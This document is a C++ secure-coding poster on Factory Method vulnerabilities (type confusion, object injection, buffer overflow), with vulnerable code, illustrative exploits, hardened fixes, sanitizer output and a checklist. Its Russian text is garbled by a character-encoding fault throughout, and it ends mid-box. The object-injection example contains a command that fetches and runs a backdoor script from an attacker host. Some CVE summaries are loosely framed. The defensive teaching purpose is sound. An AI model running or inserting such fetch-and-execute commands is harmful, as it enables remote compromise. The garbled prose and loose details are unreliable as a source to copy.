# üõ°Ô∏è Security Poster: Factory Method Pattern

## üéØ –û–±–∑–æ—Ä —É–≥—Ä–æ–∑ Factory Method Pattern

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           –ö–†–ò–¢–ò–ß–ï–°–ö–ò–ï –£–Ø–ó–í–ò–ú–û–°–¢–ò FACTORY METHOD PATTERN            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

üî¥ –ö–†–ò–¢–ò–ß–ù–´–ï –£–ì–†–û–ó–´:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Type Confusion      ‚îÇ CWE-843: Incorrect downcast –ø–æ—Å–ª–µ create()   ‚îÇ
‚îÇ                     ‚îÇ Impact: Memory corruption, RCE               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Object Injection    ‚îÇ Malicious object creation via factory        ‚îÇ
‚îÇ                     ‚îÇ Impact: Code execution, privilege escalation ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ Buffer Overflow     ‚îÇ CWE-120: Unchecked buffer allocation         ‚îÇ
‚îÇ                     ‚îÇ Impact: Heap overflow, RCE                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

üü° –í–´–°–û–ö–ò–ï –£–ì–†–û–ó–´:
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ Memory Leaks        ‚îÇ CWE-401: Factory –Ω–µ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç ownership     ‚îÇ
‚îÇ Integer Overflow    ‚îÇ Size calculation –≤ object creation           ‚îÇ
‚îÇ Unvalidated Input   ‚îÇ Factory —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç—ã –∏–∑ untrusted data    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

## üí£ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å #1: Type Confusion

### –ê–Ω–∞—Ç–æ–º–∏—è –∞—Ç–∞–∫–∏

```cpp
// ‚ùå –£–Ø–ó–í–ò–ú–´–ô –ö–û–î - Unsafe downcasting –ø–æ—Å–ª–µ factory
class Product {
public:
    virtual ~Product() = default;
    virtual void use() = 0;
};

class ConcreteProductA : public Product {
public:
    void use() override { /* ... */ }
    void specificMethodA() { /* ... */ }
};

class Factory {
public:
    virtual Product* createProduct() = 0;
};

class ConcreteFactoryA : public Factory {
public:
    Product* createProduct() override {
        return new ConcreteProductA();  // ‚ö†Ô∏è Returns base pointer
    }
};

// –£–Ø–ó–í–ò–ú–û–ï –ò–°–ü–û–õ–¨–ó–û–í–ê–ù–ò–ï
void vulnerableUsage(Factory* factory) {
    Product* product = factory->createProduct();
    
    // ‚ö†Ô∏è –û–ü–ê–°–ù–û: Unsafe downcast –±–µ–∑ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–∏–ø–∞
    auto* concrete = static_cast<ConcreteProductA*>(product);
    concrete->specificMethodA();  // üí• Type confusion if wrong type!
}
```

### üéØ Exploitation: Malicious factory injection

```cpp
// –≠–ö–°–ü–õ–û–ô–¢: Malicious factory –ø–æ–¥–º–µ–Ω—è–µ—Ç —Ç–∏–ø
class AttackerProduct : public Product {
public:
    // Memory layout –∏–º–∏—Ç–∏—Ä—É–µ—Ç ConcreteProductA
    char padding[64];
    void (*malicious_function)(void*);
    
    AttackerProduct() {
        malicious_function = (void(*)(void*))0xdeadbeef;  // Shellcode
    }
    
    void use() override { /* Harmless */ }
};

class MaliciousFactory : public Factory {
public:
    Product* createProduct() override {
        return new AttackerProduct();  // ‚ö†Ô∏è Returns wrong type!
    }
};

void exploit() {
    Factory* factory = new MaliciousFactory();
    
    // –ñ–µ—Ä—Ç–≤–∞ –¥—É–º–∞–µ—Ç —á—Ç–æ –ø–æ–ª—É—á–∞–µ—Ç ConcreteProductA
    Product* product = factory->createProduct();
    
    // Unsafe downcast
    auto* concrete = static_cast<ConcreteProductA*>(product);
    // concrete —É–∫–∞–∑—ã–≤–∞–µ—Ç –Ω–∞ AttackerProduct!
    
    // –í—ã–∑–æ–≤ specificMethodA() —á–∏—Ç–∞–µ—Ç malicious_function
    concrete->specificMethodA();
    // üí• –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ 0xdeadbeef ‚Üí RCE!
}
```

### ‚úÖ –ó–∞—â–∏—Ç–∞: Type-safe factory —Å dynamic_cast

```cpp
// ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–´–ô –ö–û–î - Type-safe factory
class SafeFactory {
public:
    virtual std::unique_ptr<Product> createProduct() = 0;
};

class SafeConcreteFactory : public SafeFactory {
public:
    std::unique_ptr<Product> createProduct() override {
        return std::make_unique<ConcreteProductA>();
    }
};

void safeUsage(SafeFactory& factory) {
    auto product = factory.createProduct();
    
    // ‚úÖ Safe downcast —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π —Ç–∏–ø–∞
    if (auto* concrete = dynamic_cast<ConcreteProductA*>(product.get())) {
        concrete->specificMethodA();  // –ë–µ–∑–æ–ø–∞—Å–Ω–æ
    } else {
        throw std::runtime_error("Unexpected product type");
    }
}

// –ï—â–µ –ª—É—á—à–µ: Type-safe factory —Å template
template<typename T>
class TypedFactory {
public:
    virtual std::unique_ptr<T> createProduct() = 0;
};

class TypeSafeConcreteFactory : public TypedFactory<ConcreteProductA> {
public:
    std::unique_ptr<ConcreteProductA> createProduct() override {
        return std::make_unique<ConcreteProductA>();
        // ‚úÖ Compile-time type safety!
    }
};
```

## üí£ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å #2: Object Injection

### –ê–Ω–∞—Ç–æ–º–∏—è –∞—Ç–∞–∫–∏

```cpp
// ‚ùå –£–Ø–ó–í–ò–ú–´–ô –ö–û–î - Factory —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç—ã –ø–æ string ID
class ObjectFactory {
private:
    std::map<std::string, std::function<Product*()>> registry_;
    
public:
    void registerProduct(const std::string& id, 
                        std::function<Product*()> creator) {
        registry_[id] = creator;  // ‚ö†Ô∏è No validation!
    }
    
    Product* create(const std::string& id) {
        auto it = registry_.find(id);
        if (it != registry_.end()) {
            return it->second();  // ‚ö†Ô∏è Creates ANY registered object!
        }
        return nullptr;
    }
};

// –õ–µ–≥–∏—Ç–∏–º–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ
objectFactory.registerProduct("safe", []() { return new SafeProduct(); });

// –ê–¢–ê–ö–ê: Registration malicious object
objectFactory.registerProduct("malicious", []() { 
    return new MaliciousProduct();  // üí•
});
```

### üéØ Exploitation: Deserialization gadget chain

```cpp
// –≠–ö–°–ü–õ–û–ô–¢: Object injection —á–µ—Ä–µ–∑ factory
class MaliciousProduct : public Product {
public:
    MaliciousProduct() {
        // –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –æ–±—ä–µ–∫—Ç–∞
        system("wget http://attacker.com/backdoor.sh | sh");
        // üí• RCE!
    }
    
    void use() override {
        // –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ malicious actions
        exfiltrateData();
    }
};

void exploit_object_injection() {
    ObjectFactory factory;
    
    // –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º —á—Ç–æ attacker –º–æ–∂–µ—Ç –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å registry
    // (—á–µ—Ä–µ–∑ config file, environment variable, database, etc.)
    
    factory.registerProduct("malicious", []() {
        return new MaliciousProduct();
    });
    
    // –ñ–µ—Ä—Ç–≤–∞ —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç –ø–æ ID –∏–∑ untrusted source
    std::string user_input = getUntrustedInput();  // "malicious"
    
    Product* product = factory.create(user_input);
    // üí• MaliciousProduct created ‚Üí RCE in constructor!
    
    product->use();
    // üí• Additional malicious actions
}
```

### ‚úÖ –ó–∞—â–∏—Ç–∞: Whitelist-based factory

```cpp
// ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–´–ô –ö–û–î - Whitelist validation
class SecureObjectFactory {
private:
    std::map<std::string, std::function<std::unique_ptr<Product>()>> registry_;
    
    // Whitelist —Ä–∞–∑—Ä–µ—à–µ–Ω–Ω—ã—Ö product IDs
    static const std::set<std::string> ALLOWED_PRODUCTS;
    
public:
    void registerProduct(const std::string& id,
                        std::function<std::unique_ptr<Product>()> creator) {
        // ‚úÖ Validate against whitelist
        if (ALLOWED_PRODUCTS.find(id) == ALLOWED_PRODUCTS.end()) {
            throw SecurityException("Product ID not whitelisted: " + id);
        }
        
        registry_[id] = creator;
    }
    
    std::unique_ptr<Product> create(const std::string& id) {
        // ‚úÖ Double-check whitelist
        if (ALLOWED_PRODUCTS.find(id) == ALLOWED_PRODUCTS.end()) {
            throw SecurityException("Invalid product ID: " + id);
        }
        
        auto it = registry_.find(id);
        if (it != registry_.end()) {
            // ‚úÖ Audit log
            logProductCreation(id);
            return it->second();
        }
        
        return nullptr;
    }
};

const std::set<std::string> SecureObjectFactory::ALLOWED_PRODUCTS = {
    "product_a",
    "product_b",
    "product_c"
    // –¢–û–õ–¨–ö–û safe products –≤ whitelist
};

// –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–∞: Enum-based factory (compile-time safety)
enum class ProductType {
    PRODUCT_A,
    PRODUCT_B,
    PRODUCT_C
};

class EnumBasedFactory {
public:
    std::unique_ptr<Product> create(ProductType type) {
        switch (type) {
            case ProductType::PRODUCT_A:
                return std::make_unique<ConcreteProductA>();
            case ProductType::PRODUCT_B:
                return std::make_unique<ConcreteProductB>();
            case ProductType::PRODUCT_C:
                return std::make_unique<ConcreteProductC>();
            default:
                throw std::runtime_error("Unknown product type");
        }
        // ‚úÖ No injection possible (compile-time validation)
    }
};
```

## üí£ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å #3: Buffer Overflow –≤ Object Creation

### –ê–Ω–∞—Ç–æ–º–∏—è –∞—Ç–∞–∫–∏

```cpp
// ‚ùå –£–Ø–ó–í–ò–ú–´–ô –ö–û–î - Unchecked size –≤ factory
class BufferProduct : public Product {
    char* buffer_;
    size_t size_;
    
public:
    BufferProduct(size_t size) : size_(size) {
        buffer_ = new char[size];  // ‚ö†Ô∏è No validation!
    }
    
    ~BufferProduct() { delete[] buffer_; }
    
    void use() override {
        // –†–∞–±–æ—Ç–∞–µ—Ç —Å buffer_
    }
};

class BufferFactory : public Factory {
public:
    Product* createProduct(size_t size) {
        return new BufferProduct(size);  // ‚ö†Ô∏è size from untrusted source!
    }
};
```

### üéØ Exploitation: Integer overflow ‚Üí heap overflow

```cpp
// –≠–ö–°–ü–õ–û–ô–¢: Integer overflow –≤ size calculation
void exploit_buffer_overflow() {
    BufferFactory factory;
    
    // –ê–¢–ê–ö–ê 1: Integer overflow
    size_t malicious_size = SIZE_MAX - 10;
    // new char[SIZE_MAX - 10] –º–æ–∂–µ—Ç overflow –≤ allocation
    // –∏–ª–∏ allocate huge buffer
    
    Product* product = factory.createProduct(malicious_size);
    // –í–æ–∑–º–æ–∂–Ω—ã–µ —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã:
    // 1. Allocation fails ‚Üí DoS
    // 2. Small buffer allocated due to overflow ‚Üí heap overflow later
    // 3. OOM ‚Üí DoS
    
    // –ê–¢–ê–ö–ê 2: Heap spray —á–µ—Ä–µ–∑ repeated allocations
    std::vector<Product*> products;
    for (int i = 0; i < 100000; ++i) {
        products.push_back(factory.createProduct(1024 * 1024));  // 1MB each
        // 100,000 * 1MB = 100GB
        // üí• Memory exhaustion ‚Üí DoS
    }
}
```

### ‚úÖ –ó–∞—â–∏—Ç–∞: Size validation + resource limits

```cpp
// ‚úÖ –ë–ï–ó–û–ü–ê–°–ù–´–ô –ö–û–î - Validated allocation
class SecureBufferProduct : public Product {
    std::vector<char> buffer_;  // ‚úÖ RAII container
    
public:
    SecureBufferProduct(size_t size) {
        // ‚úÖ Validation
        const size_t MAX_BUFFER_SIZE = 10 * 1024 * 1024;  // 10MB
        
        if (size == 0) {
            throw std::invalid_argument("Size cannot be zero");
        }
        
        if (size > MAX_BUFFER_SIZE) {
            throw std::invalid_argument(
                "Size exceeds maximum: " + std::to_string(MAX_BUFFER_SIZE)
            );
        }
        
        // ‚úÖ Check for multiplication overflow
        if (size > SIZE_MAX / sizeof(char)) {
            throw std::invalid_argument("Size would cause overflow");
        }
        
        buffer_.resize(size);  // Exception-safe allocation
    }
    
    void use() override { /* ... */ }
};

class SecureBufferFactory : public Factory {
private:
    std::atomic<size_t> total_allocated_{0};
    const size_t MAX_TOTAL_ALLOCATION = 100 * 1024 * 1024;  // 100MB
    
public:
    std::unique_ptr<Product> createProduct(size_t size) {
        // ‚úÖ Global resource limit
        size_t current_total = total_allocated_.fetch_add(size);
        
        if (current_total + size > MAX_TOTAL_ALLOCATION) {
            total_allocated_.fetch_sub(size);  // Rollback
            throw std::runtime_error("Total allocation limit exceeded");
        }
        
        try {
            return std::make_unique<SecureBufferProduct>(size);
        } catch (...) {
            total_allocated_.fetch_sub(size);  // Rollback on failure
            throw;
        }
    }
};
```

## üõ†Ô∏è –ò–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è

### 1. UBSan - Type Confusion Detection

```bash
g++ -fsanitize=undefined -g factory_vulnerabilities.cpp -o factory_ubsan

./factory_ubsan
```

**–í—ã–≤–æ–¥ UBSan**:
```
factory.cpp:45:12: runtime error: downcast of address 0x602000000010 
which does not point to an object of type 'ConcreteProductA'
0x602000000010: note: object is of type 'AttackerProduct'
```

### 2. ASan - Buffer Overflow Detection

```bash
g++ -fsanitize=address -g factory_vulnerabilities.cpp -o factory_asan

./factory_asan
```

**–í—ã–≤–æ–¥ ASan**:
```
=================================================================
==12345==ERROR: AddressSanitizer: heap-buffer-overflow
WRITE of size 8 at 0x602000000010 thread T0
    #0 0x400b12 in BufferProduct::use() factory.cpp:78
```

### 3. Static Analysis - Clang-Tidy

```bash
clang-tidy factory_vulnerabilities.cpp \
    -checks='cppcoreguidelines-pro-type-static-cast-downcast'

# Warning: do not use static_cast to downcast; use dynamic_cast
```

## üìã Security Checklist –¥–ª—è Factory Method

### Design Phase
```
[ ] –û–ø—Ä–µ–¥–µ–ª–µ–Ω ownership model (–∫—Ç–æ –≤–ª–∞–¥–µ–µ—Ç —Å–æ–∑–¥–∞–Ω–Ω—ã–º–∏ –æ–±—ä–µ–∫—Ç–∞–º–∏)
[ ] –î–æ–∫—É–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–Ω—ã –¥–æ–ø—É—Å—Ç–∏–º—ã–µ product types
[ ] –†–∞—Å—Å–º–æ—Ç—Ä–µ–Ω—ã risks –¥–ª—è object injection
[ ] –û–ø—Ä–µ–¥–µ–ª–µ–Ω—ã resource limits
```

### Implementation Phase
```
[ ] –ò—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è std::unique_ptr –¥–ª—è ownership
[ ] –ù–µ—Ç unsafe downcasting (–∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ dynamic_cast)
[ ] Whitelist validation –¥–ª—è product types
[ ] Size/resource validation –ø–µ—Ä–µ–¥ allocation
[ ] Exception-safe object creation
[ ] Type-safe registry (enum –∏–ª–∏ template)
```

### Testing Phase
```
[ ] Type confusion tests —Å UBSan
[ ] Buffer overflow tests —Å ASan
[ ] Object injection tests (malformed input)
[ ] Memory leak tests —Å Valgrind
[ ] Integer overflow tests
[ ] Fuzzing –¥–ª—è factory input
```

### Deployment Phase
```
[ ] Logging –¥–ª—è object creation (audit trail)
[ ] Monitoring –¥–ª—è resource usage
[ ] Rate limiting –¥–ª—è factory calls
[ ] Configuration validation
```

## üéì Best Practices

### 1. Type-Safe Factory —Å std::variant

```cpp
// ‚úÖ Type-safe factory —Å std::variant (C++17)
using Product = std::variant<ConcreteProductA, ConcreteProductB>;

class VariantFactory {
public:
    Product createProduct(ProductType type) {
        switch (type) {
            case ProductType::A:
                return ConcreteProductA{};
            case ProductType::B:
                return ConcreteProductB{};
        }
        // ‚úÖ Compile-time type safety
    }
};

void usage(VariantFactory& factory) {
    Product product = factory.createProduct(ProductType::A);
    
    // ‚úÖ Type-safe visitation
    std::visit([](auto&& p) {
        p.use();
    }, product);
}
```

### 2. Dependency Injection Factory

```cpp
// ‚úÖ Factory —Å explicit dependencies
class DIFactory {
    Logger& logger_;
    Config& config_;
    
public:
    DIFactory(Logger& logger, Config& config)
        : logger_(logger), config_(config) {}
    
    std::unique_ptr<Product> createProduct() {
        logger_.log("Creating product");
        
        // –°–æ–∑–¥–∞–µ–º —Å validated config
        if (!config_.isValid()) {
            throw ConfigException("Invalid config");
        }
        
        return std::make_unique<ConcreteProduct>(config_);
    }
};
```

### 3. Object Pool Factory (–¥–ª—è performance)

```cpp
// ‚úÖ Factory —Å object pooling
class PooledFactory {
    std::queue<std::unique_ptr<Product>> pool_;
    std::mutex mutex_;
    
public:
    std::unique_ptr<Product> createProduct() {
        std::lock_guard lock(mutex_);
        
        if (!pool_.empty()) {
            auto product = std::move(pool_.front());
            pool_.pop();
            return product;  // ‚úÖ Reuse from pool
        }
        
        return std::make_unique<ConcreteProduct>();  // ‚úÖ Create new
    }
    
    void returnProduct(std::unique_ptr<Product> product) {
        std::lock_guard lock(mutex_);
        pool_.push(std::move(product));  // Return to pool
    }
};
```

## üö® CVE Examples

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ        –ò–ó–í–ï–°–¢–ù–´–ï CVE –° FACTORY METHOD VULNERABILITIES          ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

CVE-2017-5638 (Apache Struts 2)
‚îú‚îÄ –¢–∏–ø: Object injection —á–µ—Ä–µ–∑ Content-Type parsing
‚îú‚îÄ CVSS: 10.0 (CRITICAL)
‚îú‚îÄ Impact: RCE —á–µ—Ä–µ–∑ malicious object creation
‚îî‚îÄ –ü—Ä–∏—á–∏–Ω–∞: Factory —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç—ã –∏–∑ unvalidated headers

CVE-2019-12384 (Jackson Databind)
‚îú‚îÄ –¢–∏–ø: Polymorphic deserialization ‚Üí RCE
‚îú‚îÄ CVSS: 9.8 (CRITICAL)
‚îú‚îÄ Impact: RCE —á–µ—Ä–µ–∑ malicious type specification
‚îî‚îÄ –ü—Ä–∏—á–∏–Ω–∞: Factory —Å–æ–∑–¥–∞–µ—Ç arbitrary types from JSON

CVE-2015-7501 (JBoss)
‚îú‚îÄ –¢–∏–ø: Java deserialization RCE
‚îú‚îÄ CVSS: 9.8 (CRITICAL)
‚îú‚îÄ Impact: RCE through object factory abuse
‚îî‚îÄ –ü—Ä–∏—á–∏–Ω–∞: Unvalidated object creation in factory
```

## üìö –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–µ —Ä–µ—Å—É—Ä—Å—ã

### –°—Ç–∞–Ω–¥–∞—Ä—Ç—ã
- **CWE-843**: Access of Resource Using Incompatible Type
- **CWE-502**: Deserialization of Untrusted Data
- **CWE-120**: Buffer Overflow
- **CWE-190**: Integer Overflow

### –ö–Ω–∏–≥–∏
- "Design Patterns" - Gang of Four
- "Effective C++" - Scott Meyers
- "Secure Coding in C and C++" - Robert Seacord

## üí° –ó–æ–ª–æ—Ç–æ–µ –ø—Ä–∞–≤–∏–ª–æ Factory Security

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                                                                ‚îÇ
‚îÇ  "Factory —Å–æ–∑–¥–∞–µ—Ç –æ–±—ä–µ–∫—Ç—ã - validate –í–°–ï inputs.              ‚îÇ
‚îÇ   –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ whitelist –¥–ª—è product types.                    ‚îÇ
‚îÇ   –í–∞–ª–∏–¥–∏—Ä—É–π—Ç–µ sizes –∏ resources –ü–ï–†–ï–î allocation.             ‚îÇ
‚îÇ   –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ smart pointers –¥–ª—è ownership."                  ‚îÇ
‚îÇ                                                                ‚îÇ
‚îÇ  –ù–∏–∫–æ–≥–¥–∞ –Ω–µ —Å–æ–∑–¥–∞–≤–∞–π—Ç–µ –æ–±—ä–µ–∫—Ç—ã –∏–∑ untrusted data –±–µ–∑          ‚îÇ
‚îÇ  whitelist validation –∏ type checking!                         ‚îÇ
‚îÇ                                                                ‚îÇ
